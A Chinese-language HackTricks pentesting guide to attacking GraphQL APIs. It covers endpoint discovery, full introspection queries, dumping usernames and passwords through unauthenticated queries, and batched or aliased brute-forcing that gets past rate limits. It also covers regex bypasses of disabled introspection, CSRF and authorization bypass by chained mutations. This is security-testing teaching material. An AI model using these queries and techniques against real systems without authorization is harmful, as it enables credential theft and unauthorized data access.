# GraphQL

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 介绍

GraphQL作为REST API的替代品。REST API要求客户端向API的不同端点发送多个请求，以从后端数据库查询数据。使用GraphQL，您只需要发送一个请求来查询后端。这更简单，因为您不必向API发送多个请求，单个请求就可以收集所有必要的信息。

## GraphQL

随着新技术的出现，也会出现新的漏洞。**默认情况下**，GraphQL**不**实现**认证**，这需要由开发者来实现。这意味着默认情况下GraphQL允许任何人查询它，任何敏感信息都将无需认证即可供攻击者使用。

在执行目录暴力攻击时，请确保添加以下路径以检查GraphQL实例。

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

一旦您找到一个开放的GraphQL实例，您需要知道**它支持哪些查询**。这可以通过使用内省系统来完成，更多详情可以在这里找到：[**GraphQL：API的查询语言。**\
询问GraphQL模式支持哪些查询通常很有用。GraphQL允许我们这样做…](https://graphql.org/learn/introspection/)

### 指纹

工具[**graphw00f**](https://github.com/dolevf/graphw00f)能够检测服务器中使用的GraphQL引擎，然后为安全审计员打印一些有用的信息。

#### 通用查询 <a href="#universal-queries" id="universal-queries"></a>

如果您向任何GraphQL端点发送`query{__typename}`，它的响应中将包含字符串`{"data": {"__typename": "query"}}`。这被称为通用查询，是探测URL是否对应于GraphQL服务的有用工具。

这个查询之所以有效，是因为每个GraphQL端点都有一个保留字段`__typename`，它以字符串形式返回查询对象的类型。

### 基本枚举

GraphQL通常支持**GET**、**POST**（x-www-form-urlencoded）和**POST**（json）。尽管出于安全考虑，建议只允许json以防止CSRF攻击。

#### 内省

要使用内省来发现模式信息，请查询`__schema`字段。这个字段在所有查询的根类型上都可用。
```bash
query={__schema{types{name,fields{name}}}}
```
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```
{% endcode %}

使用此查询，您将找到正在使用的所有类型的名称：
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

通过这个查询，您可以提取所有类型、它的字段以及它的参数（以及参数的类型）。这将非常有助于了解如何查询数据库。

![](<../../.gitbook/assets/image (207) (3).png>)

**错误**

了解是否会**显示**错误很有趣，因为它们会提供有用的**信息。**
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**通过内省枚举数据库模式**

{% hint style="info" %}
如果内省功能已启用，但上述查询无法运行，请尝试从查询结构中移除 `onOperation`、`onFragment` 和 `onField` 指令。
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
内联自省查询：
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
最后一行代码是一个graphql查询，它将转储graphql的所有元信息（对象名称、参数、类型等）。

![](<../../.gitbook/assets/image (206).png>)

如果启用了内省，您可以使用 [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) 在GUI中查看所有选项。

### 查询

现在我们知道数据库内保存了哪些类型的信息，让我们尝试**提取一些值**。

在内省中，您可以找到**可以直接查询的对象**（因为对象的存在并不意味着您可以查询它）。在下图中，您可以看到“_queryType_”被称为“_Query_”，并且“_Query_”对象的一个字段是“_flags_”，它也是一个对象类型。因此，您可以查询flag对象。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

请注意，查询“_flags_”的类型是“_Flags_”，并且此对象定义如下：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

您可以看到“_Flags_”对象由**name** 和 **value** 组成。然后您可以使用以下查询获取所有flags的名称和值：
```javascript
query={flags{name, value}}
```
请注意，如果**查询对象**是像下面例子中的**基本** **类型**，如**字符串**

![](<../../.gitbook/assets/image (441).png>)

您可以直接使用以下查询方式：
```javascript
query={hiddenFlags}
```
在另一个例子中，"_Query_" 类型对象内有两个对象："_user_" 和 "_users_"。\
如果这些对象不需要任何参数就能搜索，你可以通过请求你想要的数据来**检索它们的所有信息**。在这个来自互联网的例子中，你可以提取保存的用户名和密码：

![](<../../.gitbook/assets/image (208).png>)

然而，在这个例子中，如果你尝试这样做，你会得到这个**错误**：

![](<../../.gitbook/assets/image (210).png>)

看起来它会以某种方式使用类型为 _**Int**_ 的 "_**uid**_" 参数进行搜索。\
无论如何，我们已经知道，在[基本枚举](graphql.md#basic-enumeration)部分，有一个查询被提出，它向我们展示了所有需要的信息：`query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

如果你阅读我运行那个查询时提供的图片，你会看到 "_**user**_" 有一个类型为 _Int_ 的 **arg** "_**uid**_"。

所以，进行一些轻量级的 _**uid**_ 暴力破解，我发现在 _**uid**=**1**_ 时检索到了一个用户名和密码：\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

请注意，我**发现**我可以请求参数 "_**user**_" 和 "_**password**_"，因为如果我尝试查找不存在的东西（`query={user(uid:1){noExists}}`），我会得到这个错误：

![](<../../.gitbook/assets/image (213).png>)

并且在**枚举阶段**，我发现 "_**dbuser**_" 对象的字段有 "_**user**_" 和 "_**password**_"。

**查询字符串转储技巧（感谢 @BinaryShadow\_）**

如果你可以通过字符串类型搜索，比如：`query={theusers(description: ""){username,password}}`，并且你**搜索一个空字符串**，它会**转储所有数据**。（_注意这个例子与教程的例子无关，假设你可以使用 "**theusers**" 通过一个叫做 "**description**" 的 String 字段进行搜索_）。

GraphQL 是一项相对较新的技术，开始在初创公司和大型企业中获得一些关注。除了默认缺少身份验证之外，GraphQL 端点还可能容易受到其他漏洞的影响，如 IDOR。

### 搜索

以这样一个例子为例，想象一个数据库，其中包含通过电子邮件和姓名标识的**人员**，以及通过名称和评级标识的**电影**。一个**人**可以与其他**人**成为**朋友**，并且一个人可以**拥有电影**。

你可以通过**姓名**来**搜索**人员，并获取他们的电子邮件：
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
你可以**通过**姓名**搜索**人员并获取他们**订阅**的**电影**：
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
请注意，如何指示检索人员的 `subscribedMovies` 的 `name`。

您还可以**同时搜索多个对象**。在这种情况下，进行了2部电影的搜索：
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
甚至是**使用别名的几个不同对象的关系**：
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### 变更

**变更用于在服务器端进行更改。**

在**内省**中，你可以找到已声明的**变更**。在下图中，"_MutationType_" 被称为 "_Mutation_"，而 "_Mutation_" 对象包含变更的名称（例如本例中的 "_addPerson_"）：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

以这样一个例子为例，想象一个数据库，其中**人员**由电子邮件和姓名标识，**电影**由名称和评分标识。一个**人**可以与其他**人**成为**朋友**，并且一个人可以**拥有电影**。

在数据库中**创建新**电影的变更可能如下所示（在此示例中，变更称为 `addMovie`）：
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**请注意查询中如何指明了数据的值和类型。**

也可能有一个用于**创建** **人员**的**变更**（在此示例中称为`addPerson`），包括朋友和文件（注意在创建与他们相关的人员之前，朋友和影片必须已经存在）：
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### 在1个API请求中批量暴力破解

此信息取自 [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)。通过GraphQL API进行认证，**同时发送许多带有不同凭证的查询**来检查。这是一种经典的暴力破解攻击，但由于GraphQL的批处理功能，现在可以在每个HTTP请求中发送不止一个登录/密码对。这种方法会欺骗外部速率监控应用程序，使其认为一切正常，没有试图猜测密码的暴力破解机器人。

下面您可以找到一个应用程序认证请求的最简单示例，**一次有3个不同的电子邮件/密码对**。显然，可以以同样的方式在单个请求中发送数千个：

![](<../../.gitbook/assets/image (182) (1).png>)

从响应截图中我们可以看到，第一个和第三个请求返回了 _null_ 并在 _error_ 部分反映了相应的信息。**第二个变更有正确的认证**数据，响应中有正确的认证会话令牌。

![](<../../.gitbook/assets/image (119) (1).png>)

## 禁用内省的GraphQL

越来越多的**graphql端点正在禁用内省**。然而，graphql在收到意外请求时抛出的错误足以让像 [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) 这样的工具重建大部分架构。

此外，Burp Suite扩展 [**GraphQuail**](https://github.com/forcesunseen/graphquail) 扩展**观察通过Burp的GraphQL API请求**并**构建**一个内部GraphQL **架构**，每看到一个新查询就添加进去。它还可以为GraphiQL和Voyager暴露架构。当收到内省查询时，扩展会返回一个假响应。结果，GraphQuail显示了API内可用的所有查询、参数和字段。更多信息请[**查看这里**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

一个不错的**词表**，用于发现[**GraphQL实体可以在这里找到**](https://github.com/Escape-Technologies/graphql-wordlist?)。

### 绕过GraphQL内省防御 <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

如果您无法让您正在测试的API运行内省查询，请尝试在`__schema`关键字后插入**特殊字符**。

当开发者禁用内省时，他们可能会使用正则表达式来排除查询中的`__schema`关键字。您应该尝试像**空格**、**换行符**和**逗号**这样的字符，因为它们被GraphQL**忽略**，但不会被有缺陷的正则表达式忽略。

因此，如果开发者只排除了`__schema{`，那么下面的内省查询将不会被排除。
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
如果这不起作用，尝试在其他请求方法上运行探针，因为内省可能仅在POST上被禁用。尝试一个GET请求，或者一个内容类型为`x-www-form-urlencoded`的POST请求。

### 泄露的GraphQL结构

如果内省被禁用，尝试查看网站源代码。查询通常预先加载到浏览器中作为javascript库。这些预写的查询可以揭示有关模式和每个对象及功能使用的强大信息。开发者工具的`Sources`标签可以搜索所有文件以枚举查询保存的位置。有时甚至受管理员保护的查询已经暴露。
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQL中的CSRF

如果你不知道CSRF是什么，请阅读以下页面：

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

在外面，你会发现许多GraphQL端点**没有配置CSRF令牌。**

请注意，GraphQL请求通常通过使用Content-Type **`application/json`** 的POST请求发送。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
然而，大多数GraphQL端点也支持 **`form-urlencoded` POST请求：**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
因此，由于像前面的 CSRF 请求是**不带预检请求发送的**，因此可以通过 CSRF 滥用 GraphQL 来**执行**更改。

但是，请注意 Chrome 的 `samesite` 标志的新默认 cookie 值是 `Lax`。这意味着 cookie 只会在第三方网站的 GET 请求中发送。

请注意，通常也可以将**查询**请求作为**GET**请求发送，并且 CSRF 令牌可能不会在 GET 请求中被验证。

此外，滥用 [**XS-Search**](../../pentesting-web/xs-search.md) **攻击**可能可以利用用户的凭证从 GraphQL 端点泄露内容。

有关更多信息，请**查看**[**原始帖子**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)。

## GraphQL 中的授权

定义在端点上的许多 GraphQL 函数可能只检查请求者的身份验证，而不检查授权。

修改查询输入变量可能导致敏感账户详情[泄露](https://hackerone.com/reports/792927)。

Mutation 甚至可能导致尝试修改其他账户数据的账户接管。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### 在GraphQL中绕过授权

[链接查询](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)可以绕过弱身份验证系统。

在下面的例子中，你可以看到操作是“forgotPassword”，它应该只执行与之关联的forgotPassword查询。通过在末尾添加一个查询可以绕过这个限制，在这个例子中我们添加了“register”和一个用户变量，以便系统注册为新用户。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## 使用别名绕过速率限制

通常情况下，GraphQL对象不能包含多个同名属性。别名允许你通过**明确命名你想要API返回的属性**来绕过这一限制。你可以使用别名在一个请求中返回**同一类型对象的多个实例**。

有关GraphQL别名的更多信息，请参见[别名](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)。

虽然别名的目的是减少你需要进行的API调用次数，但它们也可以用来对GraphQL端点进行暴力破解。

许多端点会有某种**速率限制器来防止暴力破解攻击**。一些速率限制器是基于接收到的**HTTP请求数量**而不是在端点上执行的操作数量。因为别名实际上允许你在单个HTTP消息中发送多个查询，它们可以绕过这个限制。

下面的简化示例显示了一系列**别名查询，检查商店折扣码是否有效**。这个操作可能绕过速率限制，因为它是一个单一的HTTP请求，尽管它可能被用来一次检查大量的折扣码。
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## 工具

### 漏洞扫描器

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): 工具包，可用于抓取架构和搜索敏感数据，测试授权，暴力破解架构，以及找到通往给定类型的路径。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): 可作为独立工具或[Burp 扩展](https://github.com/doyensec/inql)使用。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): 也可以作为CLI客户端使用，以自动化攻击。
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): 列出在GraphQL架构中到达给定类型的不同方法的工具。
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): 用于高级GraphQL测试的Burp扩展。_**Scanner**_ 是InQL v5.0的核心，您可以分析GraphQL端点或本地自省架构文件。它自动生成所有可能的查询和变更，并将它们组织成结构化视图以供您分析。_**Attacker**_ 组件允许您运行批量GraphQL攻击，这对于绕过实现不佳的速率限制很有用。

### 客户端

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI客户端
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI客户端

### 自动化测试

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* 解释AutoGraphQL的视频: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考资料

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
